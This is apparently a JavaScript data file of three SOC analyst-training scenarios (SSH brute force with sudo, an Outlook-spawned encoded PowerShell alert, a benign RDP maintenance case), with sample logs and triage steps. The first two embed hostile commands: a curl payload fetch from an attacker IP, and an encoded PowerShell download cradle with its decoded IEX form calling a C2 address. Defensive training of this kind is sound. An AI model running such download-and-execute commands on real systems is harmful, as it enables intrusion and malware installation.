/**
 * SOC Alert Triage Scenarios for Tier 1 Analyst Training.
 * Realistic enterprise security alerts with log artifacts, threat intelligence findings, and triage guidance.
 */

export const SOC_INCIDENTS_DATA = [
  {
    id: 'inc-101',
    alertId: 'SEC-2026-8941',
    title: 'Multiple Failed SSH Logons Followed by Successful Sudo Execution',
    severity: 'High',
    category: 'Brute Force & Privilege Escalation',
    mitreTactic: 'Credential Access (TA0006) / Privilege Escalation (TA0004)',
    mitreTechnique: 'Brute Force (T1110.001) / Sudo (T1548.003)',
    timestamp: '2026-08-31 03:14:22 UTC',
    affectedHost: 'srv-prod-db01 (10.0.4.18)',
    targetUser: 'ubuntu -> root',
    sourceIp: '198.51.100.42 (Public VPS - External)',
    rawLogs: [
      '2026-08-31T03:14:02Z srv-prod-db01 sshd[14201]: Failed password for invalid user admin from 198.51.100.42 port 48212 ssh2',
      '2026-08-31T03:14:05Z srv-prod-db01 sshd[14205]: Failed password for invalid user test from 198.51.100.42 port 48214 ssh2',
      '2026-08-31T03:14:08Z srv-prod-db01 sshd[14209]: Failed password for invalid user oracle from 198.51.100.42 port 48216 ssh2',
      '2026-08-31T03:14:15Z srv-prod-db01 sshd[14214]: Accepted password for ubuntu from 198.51.100.42 port 48220 ssh2',
      '2026-08-31T03:14:20Z srv-prod-db01 sudo[14230]: pam_unix(sudo:session): session opened for user root by ubuntu(uid=1000)',
      '2026-08-31T03:14:22Z srv-prod-db01 auditd[14240]: type=EXECVE msg=audit: argc=3 a0="curl" a1="-sO" a2="http://198.51.100.42/setup.sh"'
    ],
    threatIntel: {
      ipReputation: '198.51.100.42 listed on AbuseIPDB (94% malicious confidence, reported 412 times for SSH brute force)',
      geo: 'External Autonomous System (Bulgaria / Unknown Hosting)',
      domain: 'setup.sh contains staging script downloading compiled cryptominer'
    },
    suggestedVerdict: 'True Positive',
    investigationSteps: [
      'Verify source IP 198.51.100.42 - External untrusted address with malicious reputation.',
      'Correlate rapid failed authentication attempts (brute force) preceding successful logon for ubuntu.',
      'Check post-authentication activity: Sudo privilege escalation and curl payload download observed.',
      'Immediate containment: Block IP 198.51.100.42 at edge firewall, terminate active SSH session PID 14214, reset ubuntu credentials, isolate host for triage.'
    ]
  },
  {
    id: 'inc-102',
    alertId: 'SEC-2026-9014',
    title: 'Suspicious Encoded PowerShell Execution with Outbound Network Connection',
    severity: 'Critical',
    category: 'Execution & Command & Control',
    mitreTactic: 'Execution (TA0002) / Defense Evasion (TA0005)',
    mitreTechnique: 'PowerShell (T1059.001) / Deobfuscate/Decode Files or Information (T1140)',
    timestamp: '2026-08-31 09:45:10 UTC',
    affectedHost: 'WS-FINANCE-09 (192.168.10.77)',
    targetUser: 'emily.watson',
    sourceIp: '192.168.10.77 -> 203.0.113.88:8443',
    rawLogs: [
      'EventID: 1 (Sysmon Process Create) | UtcTime: 2026-08-31 09:44:55.102 | ProcessId: 4912 | Image: C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE',
      'EventID: 1 (Sysmon Process Create) | UtcTime: 2026-08-31 09:45:02.341 | ParentProcessId: 4912 | ParentImage: OUTLOOK.EXE | Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | CommandLine: powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA4ADgAOgA4ADQANAAzAC8AcABhAHkAbABvAGEAZAAnACkA',
      'EventID: 3 (Sysmon Network Connect) | UtcTime: 2026-08-31 09:45:05.811 | Image: powershell.exe | SourceIp: 192.168.10.77 | DestinationIp: 203.0.113.88 | DestinationPort: 8443'
    ],
    threatIntel: {
      decodedCommand: "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.88:8443/payload')",
      ipReputation: '203.0.113.88 flagged on AlienVault OTX as active Cobalt Strike C2 server listener',
      emailContext: 'Email Gateway logs show inbound email with Subject: "Overdue Invoice #INV-8821.zip" received 5 minutes prior'
    },
    suggestedVerdict: 'True Positive',
    investigationSteps: [
      'Identify Parent-Child relationship: OUTLOOK.EXE spawning powershell.exe is a classic malicious macro/attachment execution anomaly.',
      'Decode Base64 payload in CyberChef or Python: Reveals download cradle executing remote script into memory.',
      'Confirm active network connection on port 8443 to known C2 server.',
      'Immediate containment: Isolate workstation WS-FINANCE-09 via EDR immediately, search email server for other recipients of same invoice email and purge.'
    ]
  },
  {
    id: 'inc-103',
    alertId: 'SEC-2026-9150',
    title: 'Routine IT Administrator Remote Maintenance (False Positive Verification)',
    severity: 'Medium',
    category: 'Administrative Activity',
    mitreTactic: 'Lateral Movement (TA0008)',
    mitreTechnique: 'Remote Services: RDP (T1021.001)',
    timestamp: '2026-08-31 14:10:00 UTC',
    affectedHost: 'SRV-FILE-BACKUP (10.0.1.20)',
    targetUser: 'admin_david (IT Sysadmin)',
    sourceIp: '10.0.1.5 (IT Management Workstation)',
    rawLogs: [
      'EventID: 4624 (Security) | LogonType: 10 (RemoteInteractive/RDP) | TargetUserName: admin_david | WorkstationName: IT-ADMIN-WS01 | IpAddress: 10.0.1.5',
      'EventID: 4672 (Security) | Special Privileges Assigned: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege',
      'EventID: 7045 (System) | ServiceName: VeeamBackupAgentUpdate | ServiceFileName: "C:\\Program Files\\Veeam\\Backup\\agent.exe"'
    ],
    threatIntel: {
      changeManagementTicket: 'CHG-9924 Approved: Scheduled Sunday afternoon backup agent upgrade across internal file servers',
      userContext: 'admin_david is senior system administrator on the approved maintenance shift'
    },
    suggestedVerdict: 'False Positive',
    investigationSteps: [
      'Verify source IP 10.0.1.5 is inside internal IT Management VLAN.',
      'Cross-reference change management ticketing system for approved maintenance windows.',
      'Examine service binary name (VeeamBackupAgentUpdate) and publisher signature.',
      'Verdict: Authorized administrative maintenance activity. Close ticket as Benign / False Positive with reference to CHG-9924.'
    ]
  }
];
